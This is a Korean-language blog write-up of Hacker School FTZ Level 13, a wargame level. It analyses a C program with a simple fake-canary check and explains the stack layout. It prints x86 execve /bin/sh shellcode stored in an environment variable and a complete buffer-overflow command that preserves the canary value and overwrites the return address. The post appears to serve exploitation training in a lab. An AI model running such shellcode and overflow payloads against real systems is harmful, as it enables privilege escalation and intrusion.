---
layout: post
title: "Hacker School FTZ - Level 13"
description: "Do you know the canary?"
comments: true
categories: FTZ
---

<img data-action="zoom" src='{{ "assets/ftz/level13/1.jpg" | relative_url }}' alt='relative'>  

## 1) level13/have no clue 입력해 로그인  
 
<img data-action="zoom" src='{{ "assets/ftz/level13/2.png" | relative_url }}' alt='relative'>  

``` c
#include <stdlib.h>

main(int argc, char *argv[])
{
    long i=0x1234567;
    char buf[1024];

    setreuid( 3094, 3094 );
    if(argc > 1)
       strcpy(buf,argv[1]);

    if(i != 0x1234567) {
       printf(" Warnning: Buffer Overflow !!! \n");
       kill(0,11);
    }
}
```

코드를 살펴보니 유사 카나리 기법이 적용된 것 같습니다.  
buf 배열을 NOP으로만 채우면 i값을 비교하는 if 문에 의해 프로그램이 종료될 것입니다.  

그럼 해당 프로그램의 스택 구조를 살펴보겠습니다.  

## 2) 스택의 구조 살펴보기  

<img data-action="zoom" src='{{ "assets/ftz/level13/3.png" | relative_url }}' alt='relative'>  

tmp 디렉토리로 이동하여 hint 코드를 복사해 프로그램을 하나 만들어줍니다.  

<img data-action="zoom" src='{{ "assets/ftz/level13/4.png" | relative_url }}' alt='relative'>  

위 그림의 어셈블리어 코드를 살펴보면 buf 배열의 위치는 $ebp에서 1048 byte 떨어진 위치에 있습니다.  

그리고 $ebp-12 주소에 0x1234567 값이 저장되어 있습니다.  

<img data-action="zoom" src='{{ "assets/ftz/level13/5.png" | relative_url }}' alt='relative'>  

스택을 도식화하면 위의 그림과 같습니다.  

## 3) 환경 변수에 쉘코드 저장하기  

환경 변수에 쉘코드를 저장하고 해당 환경 변수의 주소를 구하는 방법은 아래와 같습니다.  
환경 변수에 대한 내용과 쉘코드를 환경 변수에 저장하는 이유를 확인하기 위해 <a href="https://hsong2.github.io/ftz/2021/05/31/Hacker-School-FTZ-Level-12.html#env">level12</a> 내용을 확인해주세요.  

<img data-action="zoom" src='{{ "assets/ftz/level13/6.png" | relative_url }}' alt='relative'>  

``` bash
export EGG=`python -c 'print "\x90"*15+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```

``` bash
echo 'int main() { printf("ADDR -> 0x%x\n", getenv("EGG")); }' > getenv.c
```

``` bash
gcc -o getenv getenv.c
```

## 4) BOF 수행하기  

앞선 문제들 같은 경우엔 buf 배열 + dummy + SFP 부분은 모두 NOP으로만 채웠겠지만  
dummy 부분에 BOF를 탐지하는 유사 카나리 기법이 적용되어 있기 때문에 이 부분을 우회하도록 하겠습니다.  

위의 스택의 구조를 도식화한 그림을 보면 buf 배열(1024 byte) + dummy(12 byte) + "0x1234567" + dummy(8 byte) + SFP + RET로 스택이 구성되어 있습니다.  
따라서 "\x90"*1036+"\x67\x45\x23\x01"+"\x90"*12+"\[EGG 환경 변수 주소\]"를 입력하면 됩니다.  

위에서 EGG 환경 변수 주소를 구했기 때문에 바로 프로그램에 BOF를 시도하겠습니다.  

``` bash
./attackme `python -c 'print "\x90"*1036+"\x67\x45\x23\x01"+"\x90"*12+"\x8d\xfc\xff\xbf"'`
```

<img data-action="zoom" src='{{ "assets/ftz/level13/7.png" | relative_url }}' alt='relative'>  
